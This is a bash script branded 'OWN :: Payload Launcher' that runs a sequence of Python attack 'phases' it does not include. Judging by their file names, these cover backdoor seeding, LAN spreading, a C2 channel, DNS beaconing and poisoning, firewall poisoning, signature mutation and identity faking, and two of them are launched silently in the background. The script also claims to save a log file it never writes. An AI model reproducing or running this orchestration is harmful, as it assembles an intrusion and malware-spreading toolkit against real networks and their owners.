#!/bin/bash

clear

# █ Banner █
cat << "EOF"
 ▒█████   █     █░███▄    █
▒██▒  ██▒▓█░ █ ░█░██ ▀█   █
▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒
▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒
░ ████▓▒░░░██▒██▓▒██░   ▓██░
░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒
  ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░
░ ░ ░ ▒    ░   ░    ░   ░ ░
    ░ ░      ░            ░

       OWN :: Payload Launcher
       Timestamp: $(date)
──────────────────────────────────────────────
EOF

# █ Directory Setup █
PHASE_DIR="./phases"
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# █ Phase Definitions █
PHASES=(
  "CHIMERA:chimera_injector.py"
  "ESCALATE:auto_escalator.py"
  "INJECT:code_feedback.py"
  "FORK:sandbox_forker.py"
  "ENTROPY:entropy_harvester.py"
  "BACKDOOR:backdoor_seed.py"
  "SIGNATURE:sig_mutator.py"
  "DRIFT:signal_drift.py"
  "NEURAL:neural_mutator.py"
  "AI:ai_loop.py"
  "MIRROR:phantom_mirror.py"
  "INTEL:intel_aggregator.py"
  "DECOY:decoy_generator.py"
  "IDENTITY:identity_faker.py"
  "DNS:dns_beacon.py"
  "FIREWALL:firewall_poison.py"
  "POLYMORPH:polymorpher.py"
  "SUBNET:lan_spread.py"
  "KEYSTONE:keystone_injector.py"
  "POSSESSION:phantom_c2.py"
  "POISON:dns_poisoner.py"
  "MIMIC:fingerprint_cloner.py"
  "FEEDBACK:feedback_mutator.py"
  "PIVOT:pivot_bootstrapper.py"
  "KERNEL:kernel_probe.py"
)

# █ Execution █
for PHASE_ENTRY in "${PHASES[@]}"; do
  PHASE_NAME="${PHASE_ENTRY%%:*}"
  SCRIPT_NAME="${PHASE_ENTRY##*:}"
  SCRIPT_PATH="$PHASE_DIR/$SCRIPT_NAME"

  if [[ ! -f "$SCRIPT_PATH" ]]; then
    echo "[✗] Skipping $PHASE_NAME (missing): $SCRIPT_PATH"
    continue
  fi

  if [[ "$PHASE_NAME" == "MIRROR" || "$PHASE_NAME" == "DECOY" ]]; then
    echo "[*] Phase: $PHASE_NAME (Background)"
    python "$SCRIPT_PATH" &>/dev/null &
    continue
  fi

  if [[ "$PHASE_NAME" == "POSSESSION" ]]; then
    echo "[*] Phase: $PHASE_NAME"
    python "$SCRIPT_PATH" && sleep 2 && python "$PHASE_DIR/ghost_probe.py" || echo "[✗] Error in $PHASE_NAME"
    continue
  fi

  echo "[*] Phase: $PHASE_NAME"
  python "$SCRIPT_PATH"
  [[ $? -ne 0 ]] && echo "[✗] Error in $PHASE_NAME"
done

# █ Wrap Up █
LOG_FILE="$LOG_DIR/own_run_$(date +%s).log"
echo -e "\n[✓] OWN execution complete. Logs saved to: $LOG_FILE"
